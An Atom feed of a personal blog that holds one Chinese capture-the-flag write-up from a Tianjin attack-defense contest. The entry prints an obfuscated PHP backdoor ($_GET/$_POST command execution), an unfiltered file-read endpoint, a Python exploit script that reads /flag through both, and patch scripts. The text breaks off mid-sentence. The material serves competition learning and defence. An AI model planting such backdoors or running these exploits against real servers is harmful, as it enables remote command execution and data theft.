<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lazy_forever&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/3be84ef44da20b5b934b6b90898b49e3</icon>
  
  <link href="https://blog.lazyforever.top/atom.xml" rel="self"/>
  
  <link href="https://blog.lazyforever.top/"/>
  <updated>2023-09-19T05:40:46.656Z</updated>
  <id>https://blog.lazyforever.top/</id>
  
  <author>
    <name>lazy_forever</name>
    <email>2606090126@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>天津市大学生信息安全网络攻防大赛</title>
    <link href="https://blog.lazyforever.top/2023/09/19/2023tianjindawd/"/>
    <id>https://blog.lazyforever.top/2023/09/19/2023tianjindawd/</id>
    <published>2023-09-19T05:07:18.000Z</published>
    <updated>2023-09-19T05:40:46.656Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>此次比赛设DAWD攻防赛和应急响应实战场景赛两个赛题类型，两种赛题同时开赛，其中：</p><p>① DAWD攻防赛会提供4个攻防题目环境，2个web题目环境，2个pwn题目环境，比赛开始时全部开放；</p><p>② 应急响应实战场景赛共一个场景，场景赛包含多个题目，根据问题的难度会设置不同的分值，选手可以通过提交不同题目获取相应的分值。</p><h2 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h2><p>队伍名字 NKV</p><p>DAWD攻防赛排名第一</p><img src="/2023/09/19/2023tianjindawd/dawd%E6%8E%92%E5%90%8D.png" class=""><p>应急响应排名第七</p><img src="/2023/09/19/2023tianjindawd/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E5%90%8D.png" class=""><p>总分第一</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>dawd的shop题目我们审计出了两个漏洞</p><p>第一个是在&#x2F;config&#x2F;config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="variable">$_</span>++;</span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;`&quot;</span>^<span class="string">&quot;?&quot;</span>).(<span class="string">&quot;:&quot;</span>^<span class="string">&quot;&#125;&quot;</span>).(<span class="string">&quot;%&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=(<span class="string">&quot;$&quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;-&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;|&quot;</span>);</span><br><span class="line"></span><br><span class="line">$&#123;<span class="variable">$__</span>&#125;[!<span class="variable">$_</span>]($&#123;<span class="variable">$___</span>&#125;[<span class="variable">$_</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个明显的后门，相当于<code>$_GET[&#39;0&#39;]($_POST[&#39;1&#39;])</code></p><p>直接<code>system(&#39;cat /flag&#39;)</code>就行</p><p>另一个是在&#x2F;controller&#x2F;index.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">indexController</span> <span class="keyword">extends</span> <span class="title">medoo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;yestoday&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;before&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;AshopToken&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_data</span>)));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="variable">$datas</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;cat | ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;catid&#x27;</span>] = <span class="variable">$catid</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="variable">$datas</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-1 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-2 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_contents</span>( <span class="variable">$time</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>( <span class="variable">$data</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat_more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">cat_contents</span>( <span class="variable">$catid</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="comment">//print_r($data);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>( <span class="variable">$data</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中末尾处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数file直接作为变量进行<code>file_get_contents</code>，没有对变量进行过滤，导致直接<code>?c=index&amp;a=show_pic&amp;file=/flag</code>就可以拿到flag</p><p>这里直接贴上我的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则不等式匹配flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span> (<span class="built_in">str</span>):</span><br><span class="line">    pattern = <span class="string">r&#x27;^flag\&#123;.*\&#125;$&#x27;</span></span><br><span class="line">    result = re.<span class="keyword">match</span>(pattern, <span class="built_in">str</span>).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">    PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/config/config.php?0=system&quot;</span></span><br><span class="line">uri=<span class="string">&quot;&quot;</span></span><br><span class="line">target=url+uri</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url2=<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/?c=index&amp;a=show_pic&amp;file=php://filter/resource=/flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a=requests.post(target,data=data)</span><br><span class="line">    <span class="built_in">print</span>(find_flag(a.text))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    a=requests.post(url2)</span><br><span class="line">    <span class="built_in">print</span>((<span class="built_in">str</span>(a.text)[-<span class="number">43</span>:-<span class="number">1</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>patch也贴上</p><p>patch.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">python3 patch.py </span><br><span class="line">cp index.class.php /var/www/html/controller/index.class.php</span><br></pre></td></tr></table></figure><p>index.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">indexController</span> <span class="keyword">extends</span> <span class="title">medoo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;yestoday&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;before&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;AshopToken&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_data</span>)));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$datas</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;cat | ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;catid&#x27;</span>] = <span class="variable">$catid</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$datas</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-1 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-2 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_contents</span>(<span class="variable">$time</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat_more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">cat_contents</span>(<span class="variable">$catid</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="comment">//print_r($data);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$pic</span>, <span class="string">&quot;flag&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>patch.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;/var/www/html/config/config.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.remove(file_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;File <span class="subst">&#123;file_path&#125;</span> has been successfully deleted.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error deleting <span class="subst">&#123;file_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>应急响应考察更多的是一些木马和勒索病毒的知识，模式与ctf答题模式差不多，只不过每道题给分是固定的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次打 dawd 模式，感觉 dawd 是 awd 